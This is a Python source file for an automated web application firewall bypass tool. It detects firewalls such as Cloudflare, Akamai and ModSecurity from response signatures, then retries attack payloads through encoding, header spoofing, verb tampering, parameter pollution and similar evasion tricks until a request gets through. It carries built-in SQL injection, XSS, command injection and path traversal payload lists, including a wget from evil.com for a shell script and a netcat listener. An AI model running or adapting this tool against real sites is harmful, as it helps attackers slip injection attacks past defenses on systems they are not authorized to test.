#!/usr/bin/env python3
"""
WAF (Web Application Firewall) Bypass Engine
Kombinerar tekniker frÃ¥n bypass-403, bypasswaf, bypass-url-parser och BypassFuzzer
"""

import asyncio
import logging
import re
import urllib.parse
import base64
import random
import string
from typing import Dict, Any, Optional, Union, List, Tuple
from dataclasses import dataclass
from enum import Enum
import aiohttp
import json

logger = logging.getLogger(__name__)

class WAFType(Enum):
    """Known WAF types"""
    CLOUDFLARE = "cloudflare"
    AKAMAI = "akamai"
    AWS_WAF = "aws_waf"
    AZURE_FRONT_DOOR = "azure_front_door"
    INCAPSULA = "incapsula"
    SUCURI = "sucuri"
    WORDFENCE = "wordfence"
    MODSECURITY = "modsecurity"
    F5_BIG_IP = "f5_big_ip"
    BARRACUDA = "barracuda"
    FORTINET = "fortinet"
    UNKNOWN = "unknown"

class BypassTechnique(Enum):
    """WAF bypass techniques"""
    HTTP_METHOD_OVERRIDE = "http_method_override"
    URL_ENCODING = "url_encoding"
    DOUBLE_ENCODING = "double_encoding"
    UNICODE_ENCODING = "unicode_encoding"
    CASE_MANIPULATION = "case_manipulation"
    PARAMETER_POLLUTION = "parameter_pollution"
    HEADER_INJECTION = "header_injection"
    PATH_TRAVERSAL = "path_traversal"
    HTTP_VERB_TAMPERING = "http_verb_tampering"
    CONTENT_TYPE_MANIPULATION = "content_type_manipulation"
    REQUEST_SPLITTING = "request_splitting"
    PAYLOAD_FRAGMENTATION = "payload_fragmentation"

@dataclass
class WAFBypassResult:
    """Result from WAF bypass attempt"""
    success: bool
    original_response: Dict[str, Any]
    bypassed_response: Dict[str, Any]
    technique_used: str
    payload_used: str
    confidence: float
    error: Optional[str] = None

class WAFBypassEngine:
    """Advanced WAF bypass engine with multiple techniques"""
    
    def __init__(self, config: Dict[str, Any] = None):
        self.config = config or {}
        self.techniques = self._init_bypass_techniques()
        self.waf_signatures = self._load_waf_signatures()
        self.payloads = self._load_bypass_payloads()
        
    def _init_bypass_techniques(self) -> Dict[BypassTechnique, callable]:
        """Initialize bypass techniques"""
        return {
            BypassTechnique.HTTP_METHOD_OVERRIDE: self._bypass_method_override,
            BypassTechnique.URL_ENCODING: self._bypass_url_encoding,
            BypassTechnique.DOUBLE_ENCODING: self._bypass_double_encoding,
            BypassTechnique.UNICODE_ENCODING: self._bypass_unicode_encoding,
            BypassTechnique.CASE_MANIPULATION: self._bypass_case_manipulation,
            BypassTechnique.PARAMETER_POLLUTION: self._bypass_parameter_pollution,
            BypassTechnique.HEADER_INJECTION: self._bypass_header_injection,
            BypassTechnique.PATH_TRAVERSAL: self._bypass_path_traversal,
            BypassTechnique.HTTP_VERB_TAMPERING: self._bypass_verb_tampering,
            BypassTechnique.CONTENT_TYPE_MANIPULATION: self._bypass_content_type,
            BypassTechnique.REQUEST_SPLITTING: self._bypass_request_splitting,
            BypassTechnique.PAYLOAD_FRAGMENTATION: self._bypass_payload_fragmentation
        }
    
    def _load_waf_signatures(self) -> Dict[WAFType, Dict[str, List[str]]]:
        """Load WAF detection signatures"""
        return {
            WAFType.CLOUDFLARE: {
                'headers': ['cf-ray', 'cf-cache-status', '__cfduid'],
                'body_patterns': ['attention required', 'cloudflare', 'ray id']
            },
            WAFType.AKAMAI: {
                'headers': ['akamai-grn', 'akamai-x-cache'],
                'body_patterns': ['reference #', 'access denied']
            },
            WAFType.AWS_WAF: {
                'headers': ['x-amzn-requestid', 'x-amz-cf-id'],
                'body_patterns': ['forbidden', '403 forbidden']
            },
            WAFType.INCAPSULA: {
                'headers': ['x-iinfo', 'incap_ses'],
                'body_patterns': ['incapsula incident', 'generated by incapsula']
            },
            WAFType.MODSECURITY: {
                'headers': ['mod_security'],
                'body_patterns': ['mod_security', 'forbidden', '406 not acceptable']
            }
        }
    
    def _load_bypass_payloads(self) -> Dict[str, List[str]]:
        """Load bypass payloads for different attack vectors"""
        return {
            'sql_injection': [
                "' OR '1'='1",
                "' UNION SELECT * FROM users--",
                "'; DROP TABLE users;--",
                "' OR 1=1#",
                "admin'--",
                "admin' /*",
                "' or 'a'='a",
                "') or '1'='1--",
                "') or ('1'='1--"
            ],
            'xss': [
                "<script>alert('XSS')</script>",
                "javascript:alert('XSS')",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>",
                "';alert('XSS');//",
                "<iframe src=javascript:alert('XSS')>",
                "<body onload=alert('XSS')>",
                "<input onfocus=alert('XSS') autofocus>"
            ],
            'command_injection': [
                "; ls -la",
                "| whoami",
                "&& cat /etc/passwd",
                "`id`",
                "$(whoami)",
                "; ping -c 4 127.0.0.1",
                "| nc -l 4444",
                "&& wget http://evil.com/shell.php"
            ],
            'path_traversal': [
                "../../../etc/passwd",
                "....//....//....//etc/passwd",
                "..%2f..%2f..%2fetc%2fpasswd",
                "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "....\/....\/....\/etc\/passwd"
            ]
        }
    
    async def detect_waf(self, url: str, headers: Dict[str, str] = None) -> WAFType:
        """Detect WAF type based on response headers and content"""
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(url, headers=headers or {}) as response:
                    response_headers = dict(response.headers)
                    response_body = await response.text()
                    
                    # Check each WAF signature
                    for waf_type, signatures in self.waf_signatures.items():
                        # Check headers
                        header_match = any(
                            header.lower() in [h.lower() for h in response_headers]
                            for header in signatures.get('headers', [])
                        )
                        
                        # Check body patterns
                        body_match = any(
                            pattern.lower() in response_body.lower()
                            for pattern in signatures.get('body_patterns', [])
                        )
                        
                        if header_match or body_match:
                            logger.info(f"Detected WAF: {waf_type.value}")
                            return waf_type
                    
                    return WAFType.UNKNOWN
                    
        except Exception as e:
            logger.error(f"Error detecting WAF: {e}")
            return WAFType.UNKNOWN
    
    async def bypass_waf(self, 
                        url: str,
                        payload: str,
                        technique: BypassTechnique = None,
                        waf_type: WAFType = None,
                        **kwargs) -> WAFBypassResult:
        """Attempt to bypass WAF with specified technique"""
        
        # Detect WAF if not specified
        if not waf_type:
            waf_type = await self.detect_waf(url)
        
        # Get original response (blocked)
        try:
            original_response = await self._make_request(url, payload, {})
        except Exception as e:
            original_response = {'error': str(e), 'status': 0}
        
        # Try specific technique or all techniques
        if technique:
            techniques_to_try = [technique]
        else:
            # Get recommended techniques for WAF type
            techniques_to_try = self._get_recommended_techniques(waf_type)
        
        for current_technique in techniques_to_try:
            try:
                logger.info(f"Attempting bypass with technique: {current_technique.value}")
                
                # Apply bypass technique
                bypass_func = self.techniques[current_technique]
                modified_request = await bypass_func(url, payload, **kwargs)
                
                # Make bypassed request
                bypassed_response = await self._make_request(
                    modified_request['url'],
                    modified_request.get('payload', ''),
                    modified_request.get('headers', {}),
                    modified_request.get('method', 'GET'),
                    modified_request.get('data', None)
                )
                
                # Check if bypass was successful
                success = self._is_bypass_successful(original_response, bypassed_response)
                
                if success:
                    logger.info(f"Successfully bypassed WAF with {current_technique.value}")
                    return WAFBypassResult(
                        success=True,
                        original_response=original_response,
                        bypassed_response=bypassed_response,
                        technique_used=current_technique.value,
                        payload_used=modified_request.get('payload', payload),
                        confidence=self._calculate_confidence(bypassed_response)
                    )
                    
            except Exception as e:
                logger.warning(f"Technique {current_technique.value} failed: {e}")
                continue
        
        # All techniques failed
        return WAFBypassResult(
            success=False,
            original_response=original_response,
            bypassed_response={},
            technique_used="none",
            payload_used=payload,
            confidence=0.0,
            error="All bypass techniques failed"
        )
    
    def _get_recommended_techniques(self, waf_type: WAFType) -> List[BypassTechnique]:
        """Get recommended techniques for specific WAF type"""
        recommendations = {
            WAFType.CLOUDFLARE: [
                BypassTechnique.HTTP_METHOD_OVERRIDE,
                BypassTechnique.HEADER_INJECTION,
                BypassTechnique.PAYLOAD_FRAGMENTATION,
                BypassTechnique.UNICODE_ENCODING
            ],
            WAFType.MODSECURITY: [
                BypassTechnique.CASE_MANIPULATION,
                BypassTechnique.URL_ENCODING,
                BypassTechnique.PARAMETER_POLLUTION,
                BypassTechnique.DOUBLE_ENCODING
            ],
            WAFType.AWS_WAF: [
                BypassTechnique.HTTP_VERB_TAMPERING,
                BypassTechnique.CONTENT_TYPE_MANIPULATION,
                BypassTechnique.REQUEST_SPLITTING
            ]
        }
        
        return recommendations.get(waf_type, list(self.techniques.keys()))
    
    async def _make_request(self, 
                           url: str, 
                           payload: str, 
                           headers: Dict[str, str],
                           method: str = 'GET',
                           data: Dict[str, Any] = None) -> Dict[str, Any]:
        """Make HTTP request and return response details"""
        try:
            async with aiohttp.ClientSession() as session:
                if method.upper() == 'GET':
                    full_url = f"{url}?{payload}" if payload else url
                    async with session.get(full_url, headers=headers) as response:
                        return {
                            'status': response.status,
                            'headers': dict(response.headers),
                            'body': await response.text(),
                            'url': str(response.url)
                        }
                else:
                    async with session.request(method, url, headers=headers, data=data or payload) as response:
                        return {
                            'status': response.status,
                            'headers': dict(response.headers),
                            'body': await response.text(),
                            'url': str(response.url)
                        }
                        
        except Exception as e:
            return {'error': str(e), 'status': 0}
    
    def _is_bypass_successful(self, original: Dict[str, Any], bypassed: Dict[str, Any]) -> bool:
        """Determine if bypass was successful"""
        original_status = original.get('status', 0)
        bypassed_status = bypassed.get('status', 0)
        
        # Success if we got a better status code
        if original_status in [403, 406, 418] and bypassed_status == 200:
            return True
        
        # Success if we got content when we didn't before
        original_body = original.get('body', '')
        bypassed_body = bypassed.get('body', '')
        
        if len(original_body) < 1000 and len(bypassed_body) > 1000:
            return True
        
        # Check for error messages disappearing
        error_patterns = ['blocked', 'forbidden', 'not allowed', 'access denied']
        original_has_error = any(pattern in original_body.lower() for pattern in error_patterns)
        bypassed_has_error = any(pattern in bypassed_body.lower() for pattern in error_patterns)
        
        if original_has_error and not bypassed_has_error:
            return True
        
        return False
    
    def _calculate_confidence(self, response: Dict[str, Any]) -> float:
        """Calculate confidence level of successful bypass"""
        status = response.get('status', 0)
        body = response.get('body', '')
        
        confidence = 0.5  # Base confidence
        
        if status == 200:
            confidence += 0.3
        elif status in [201, 202, 204]:
            confidence += 0.2
        
        if len(body) > 1000:
            confidence += 0.1
        
        if 'error' not in body.lower():
            confidence += 0.1
        
        return min(confidence, 1.0)
    
    # Bypass technique implementations
    async def _bypass_method_override(self, url: str, payload: str, **kwargs) -> Dict[str, Any]:
        """HTTP Method Override bypass"""
        return {
            'url': url,
            'payload': payload,
            'headers': {
                'X-HTTP-Method-Override': 'GET',
                'X-HTTP-Method': 'GET',
                'X-Method-Override': 'GET'
            },
            'method': 'POST'
        }
    
    async def _bypass_url_encoding(self, url: str, payload: str, **kwargs) -> Dict[str, Any]:
        """URL encoding bypass"""
        encoded_payload = urllib.parse.quote(payload, safe='')
        return {
            'url': url,
            'payload': encoded_payload,
            'headers': {},
            'method': 'GET'
        }
    
    async def _bypass_double_encoding(self, url: str, payload: str, **kwargs) -> Dict[str, Any]:
        """Double URL encoding bypass"""
        encoded_once = urllib.parse.quote(payload, safe='')
        double_encoded = urllib.parse.quote(encoded_once, safe='')
        return {
            'url': url,
            'payload': double_encoded,
            'headers': {},
            'method': 'GET'
        }
    
    async def _bypass_unicode_encoding(self, url: str, payload: str, **kwargs) -> Dict[str, Any]:
        """Unicode encoding bypass"""
        unicode_payload = payload.encode('utf-8').decode('unicode_escape')
        return {
            'url': url,
            'payload': unicode_payload,
            'headers': {},
            'method': 'GET'
        }
    
    async def _bypass_case_manipulation(self, url: str, payload: str, **kwargs) -> Dict[str, Any]:
        """Case manipulation bypass"""
        # Randomly change case of characters
        manipulated = ''.join(
            char.upper() if random.random() > 0.5 else char.lower()
            for char in payload
        )
        return {
            'url': url,
            'payload': manipulated,
            'headers': {},
            'method': 'GET'
        }
    
    async def _bypass_parameter_pollution(self, url: str, payload: str, **kwargs) -> Dict[str, Any]:
        """Parameter pollution bypass"""
        # Split payload across multiple parameters
        parts = payload.split('=')
        if len(parts) > 1:
            param_name, param_value = parts[0], '='.join(parts[1:])
            polluted_payload = f"{param_name}=dummy&{param_name}={param_value}"
        else:
            polluted_payload = f"dummy={payload}&real={payload}"
        
        return {
            'url': url,
            'payload': polluted_payload,
            'headers': {},
            'method': 'GET'
        }
    
    async def _bypass_header_injection(self, url: str, payload: str, **kwargs) -> Dict[str, Any]:
        """Header injection bypass"""
        return {
            'url': url,
            'payload': '',
            'headers': {
                'X-Forwarded-For': '127.0.0.1',
                'X-Real-IP': '127.0.0.1',
                'X-Originating-IP': '127.0.0.1',
                'X-Remote-IP': '127.0.0.1',
                'X-Remote-Addr': '127.0.0.1',
                'X-Cluster-Client-IP': '127.0.0.1',
                'Custom-Header': payload
            },
            'method': 'GET'
        }
    
    async def _bypass_path_traversal(self, url: str, payload: str, **kwargs) -> Dict[str, Any]:
        """Path traversal bypass"""
        # Add path traversal sequences
        traversal_url = url.replace('/', '/./').replace('//', '/../')
        return {
            'url': traversal_url,
            'payload': payload,
            'headers': {},
            'method': 'GET'
        }
    
    async def _bypass_verb_tampering(self, url: str, payload: str, **kwargs) -> Dict[str, Any]:
        """HTTP verb tampering bypass"""
        verbs = ['HEAD', 'OPTIONS', 'TRACE', 'PATCH', 'PUT', 'DELETE']
        chosen_verb = random.choice(verbs)
        
        return {
            'url': url,
            'payload': payload,
            'headers': {},
            'method': chosen_verb
        }
    
    async def _bypass_content_type(self, url: str, payload: str, **kwargs) -> Dict[str, Any]:
        """Content-Type manipulation bypass"""
        content_types = [
            'application/json',
            'text/xml',
            'application/xml',
            'multipart/form-data',
            'application/x-www-form-urlencoded',
            'text/plain'
        ]
        
        return {
            'url': url,
            'payload': payload,
            'headers': {
                'Content-Type': random.choice(content_types)
            },
            'method': 'POST'
        }
    
    async def _bypass_request_splitting(self, url: str, payload: str, **kwargs) -> Dict[str, Any]:
        """Request splitting bypass"""
        split_payload = payload.replace(' ', '\r\n')
        return {
            'url': url,
            'payload': split_payload,
            'headers': {},
            'method': 'GET'
        }
    
    async def _bypass_payload_fragmentation(self, url: str, payload: str, **kwargs) -> Dict[str, Any]:
        """Payload fragmentation bypass"""
        # Fragment payload across multiple requests
        fragments = [payload[i:i+10] for i in range(0, len(payload), 10)]
        fragmented_payload = ''.join(f"part{i}={frag}&" for i, frag in enumerate(fragments))
        
        return {
            'url': url,
            'payload': fragmented_payload.rstrip('&'),
            'headers': {},
            'method': 'GET'
        }
    
    def get_available_techniques(self) -> List[str]:
        """Get list of available bypass techniques"""
        return [technique.value for technique in BypassTechnique]
    
    def get_payloads_by_category(self, category: str) -> List[str]:
        """Get payloads for specific attack category"""
        return self.payloads.get(category, [])

# Convenience functions
async def quick_waf_bypass(url: str, payload: str) -> WAFBypassResult:
    """Quick WAF bypass with automatic technique selection"""
    engine = WAFBypassEngine()
    return await engine.bypass_waf(url, payload)

async def test_waf_bypass(url: str, payloads: List[str]) -> List[WAFBypassResult]:
    """Test multiple payloads against WAF"""
    engine = WAFBypassEngine()
    results = []
    
    for payload in payloads:
        result = await engine.bypass_waf(url, payload)
        results.append(result)
    
    return results

if __name__ == "__main__":
    # Test the WAF bypass engine
    async def test_engine():
        engine = WAFBypassEngine()
        
        print(f"Available techniques: {engine.get_available_techniques()}")
        
        # Test WAF detection
        test_url = "https://httpbin.org/get"
        waf_type = await engine.detect_waf(test_url)
        print(f"Detected WAF: {waf_type.value}")
        
        # Test bypass
        test_payload = "' OR '1'='1"
        result = await engine.bypass_waf(test_url, test_payload)
        
        print(f"Bypass successful: {result.success}")
        print(f"Technique used: {result.technique_used}")
        print(f"Confidence: {result.confidence}")
    
    asyncio.run(test_engine())
